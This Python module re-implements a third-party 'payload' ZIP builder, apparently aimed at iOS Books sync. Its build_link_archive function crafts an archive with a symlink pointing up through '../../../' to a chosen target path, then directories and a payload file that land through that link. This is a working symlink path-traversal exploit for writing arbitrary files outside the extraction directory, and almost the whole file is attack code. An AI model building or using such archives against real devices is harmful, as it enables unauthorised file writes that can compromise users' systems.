"""
payload_builder.py
==================
Byte-exact Python re-implementation of the third-party iFineOpenHide
(IFineOpenHideWindows) payload/ZIP layer, reverse engineered from the IL:

    AirliftZip.BuildLinkArchive(leafName, targetTail, payload) -> zip bytes
    AirliftZip.Build(payload, src)                            -> zip bytes
    AirliftZip.Assemble(entries)                              -> zip bytes
    AirliftZip.Crc32 / BuildCrcTable / U16 / U32 / Add
    AirliftWriter.BuildBooks(identifiers)                     -> Books.plist bytes

The ZIP is hand-assembled (the stdlib zipfile cannot reproduce the fixed
modtime/moddate, the 6-byte inlined-mode extra field, version 20 and the
absence of alignment padding), so the produced archive is byte-for-byte
identical to the reference implementation.

Only the Python standard library is used.
"""

from __future__ import annotations

import plistlib
import struct

# ---------------------------------------------------------------------------
# Verbatim constants
# ---------------------------------------------------------------------------

# ZIP entry unix modes.
MODE_DIR = 16877          # 040755  directory
MODE_FILE = 33152         # 0100600 regular file (rw-------)
MODE_SYMLINK = 41471      # 0120777 symbolic link

# Local file header / central directory fixed fields.
ZIP_LOCAL_SIG = 0x04034B50
ZIP_CENTRAL_SIG = 0x02014B50
ZIP_EOCD_SIG = 0x06054B50

VERSION_NEEDED = 20
VERSION_MADE_BY = 788          # 0x0314
FIXED_MODTIME = 10240          # 0x2800
FIXED_MODDATE = 23854          # 0x5D2E
EXTRA_MAGIC = 23123            # 0x5A53
EXTRA_FIELD_LEN = 6

# Generated-object name prefixes / names (verbatim).
PREFIX_SOURCE = "airlift-src-"
PREFIX_LINK = "airlift-link-"
PREFIX_RECOVERED = "airlift-recovered-"
PREFIX_CANARY = "airlift-canary-"
PREFIX_PROBE = "airlift-afc-probe-"

GENERATED_PREFIXES = (
    PREFIX_SOURCE,
    PREFIX_LINK,
    PREFIX_RECOVERED,
    PREFIX_CANARY,
    PREFIX_PROBE,
)

# The 6 Books files tracked for snapshot/restore/cleanup.
BOOKS_FILES = (
    "Books/Books.plist",
    "Books/Sync/Books.plist",
    "Books/Sync/Upload.plist",
    "Books/Sync/Database/OutstandingAssets_4.sqlite",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-shm",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-wal",
)


# ---------------------------------------------------------------------------
# Little-endian helpers (U16 / U32)
# ---------------------------------------------------------------------------

def u16(value: int) -> bytes:
    return struct.pack("<H", value & 0xFFFF)


def u32(value: int) -> bytes:
    return struct.pack("<I", value & 0xFFFFFFFF)


# ---------------------------------------------------------------------------
# CRC32 (table driven; polynomial 0xEDB88320)
# ---------------------------------------------------------------------------

def build_crc_table() -> list[int]:
    table: list[int] = []
    for i in range(256):
        c = i
        for _ in range(8):
            if c & 1:
                c = 0xEDB88320 ^ (c >> 1)
            else:
                c >>= 1
        table.append(c & 0xFFFFFFFF)
    return table


_CRC_TABLE = build_crc_table()


def crc32(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for b in data:
        crc = _CRC_TABLE[(crc ^ b) & 0xFF] ^ (crc >> 8)
    return crc ^ 0xFFFFFFFF


# ---------------------------------------------------------------------------
# NormalizeLiftTargetTail
# ---------------------------------------------------------------------------

def normalize_lift_targetTail(value: str) -> str:
    # null-coalesce to "" (ldarg; dup; brtrue; pop; Empty)
    arg = "" if value is None else value
    tail = arg.replace("\\", "/")
    tail = tail.strip()                 # Trim()  whitespace only
    tail = tail.lstrip("/")             # TrimStart('/')
    if not tail:
        raise ValueError("Lift target path 无效。")
    if tail.find("..") >= 0:
        raise ValueError("Lift target path 无效。")
    # Split('/', RemoveEmptyEntries)
    for seg in tail.split("/"):
        if seg == "":
            continue
        if seg == "." or seg == "..":
            raise ValueError("Lift target path 包含非法片段。")
    return tail


def _add_lift_target_tail_directories(entries: list, tail: str) -> None:
    cur = ""
    for seg in tail.split("/"):
        cur = seg if not cur else cur + "/" + seg
        entries.append((cur + "/", b"", MODE_DIR))


# ---------------------------------------------------------------------------
# Assemble : byte-exact stored ZIP
#
# Each entry is (name, data, mode).  Order is preserved exactly.
# ---------------------------------------------------------------------------

def assemble(entries: list[tuple[str, bytes, int]]) -> bytes:
    out = bytearray()
    central = bytearray()
    count = len(entries)

    for name, data, mode in entries:
        name_bytes = name.encode("utf-8")
        crc = crc32(data)
        size = len(data)
        name_len = len(name_bytes)

        # Extra field: 0x5A53, field length 2, then the low-16-bit mode.
        extra = u16(EXTRA_MAGIC) + u16(2) + u16(mode & 0xFFFF)

        # --- Local file header ---
        local_offset = len(out)
        out += u32(ZIP_LOCAL_SIG)
        out += u16(VERSION_NEEDED)        # version needed
        out += u16(0)                     # flags
        out += u16(0)                     # method = stored
        out += u16(FIXED_MODTIME)
        out += u16(FIXED_MODDATE)
        out += u32(crc)
        out += u32(size)                  # compressed size
        out += u32(size)                  # uncompressed size
        out += u16(name_len)
        out += u16(EXTRA_FIELD_LEN)
        out += name_bytes
        out += extra
        out += data

        # --- Central directory header ---
        central += u32(ZIP_CENTRAL_SIG)
        central += u16(VERSION_MADE_BY)   # version made by
        central += u16(VERSION_NEEDED)    # version needed
        central += u16(0)                 # flags
        central += u16(0)                 # method
        central += u16(FIXED_MODTIME)
        central += u16(FIXED_MODDATE)
        central += u32(crc)
        central += u32(size)
        central += u32(size)
        central += u16(name_len)
        central += u16(EXTRA_FIELD_LEN)  # extra len (same 6-byte field)
        central += u16(0)                 # comment len
        central += u16(0)                 # disk number start
        central += u16(0)                 # internal attrs
        central += u32((mode & 0xFFFF) << 16)   # external attrs
        central += u32(local_offset)
        central += name_bytes
        central += extra

    cd_offset = len(out)
    out += central
    cd_size = len(central)

    # --- End of central directory ---
    out += u32(ZIP_EOCD_SIG)
    out += u16(0)                     # number of this disk
    out += u16(0)                     # disk with start of central dir
    out += u16(count)                 # entries on this disk
    out += u16(count)                 # total entries
    out += u32(cd_size)
    out += u32(cd_offset)
    out += u16(0)                     # comment length

    return bytes(out)


# ---------------------------------------------------------------------------
# BuildLinkArchive / Build
# ---------------------------------------------------------------------------

def _zip_metadata() -> bytes:
    return plistlib.dumps({"Version": 2}, fmt=plistlib.FMT_BINARY)


def build_link_archive(leaf_name: str, target_tail: str,
                       payload: bytes) -> bytes:
    metadata = _zip_metadata()
    leaf = "link" if (leaf_name is None or not leaf_name.strip()) else leaf_name
    link_path = "p0/p1/p2/" + leaf
    tail = normalize_lift_targetTail(target_tail)
    link_bytes = ("../../../" + tail).encode("utf-8")

    entries: list[tuple[str, bytes, int]] = [
        ("META-INF/", b"", MODE_DIR),
        ("META-INF/com.apple.ZipMetadata.plist", metadata, MODE_FILE),
        ("p0/", b"", MODE_DIR),
        ("p0/p1/", b"", MODE_DIR),
        ("p0/p1/p2/", b"", MODE_DIR),
        (link_path, link_bytes, MODE_SYMLINK),
    ]
    _add_lift_target_tail_directories(entries, tail)
    entries.append(("payload", payload, MODE_FILE))
    return assemble(entries)


def build(leaf_name: str, target_tail: str, payload: bytes) -> bytes:
    return build_link_archive(leaf_name, target_tail, payload)


# ---------------------------------------------------------------------------
# BuildBooks : Books/Sync/Books.plist
#
# Each identifier -> {"Persistent ID": id, "Item ID": "<i+1>", "DSID": "1"}
# outer: {"Books": [ ... ]}
# ---------------------------------------------------------------------------

def build_books(identifiers: list[str]) -> bytes:
    rows = [
        {"Persistent ID": identifier, "Item ID": str(i + 1), "DSID": "1"}
        for i, identifier in enumerate(identifiers)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY)
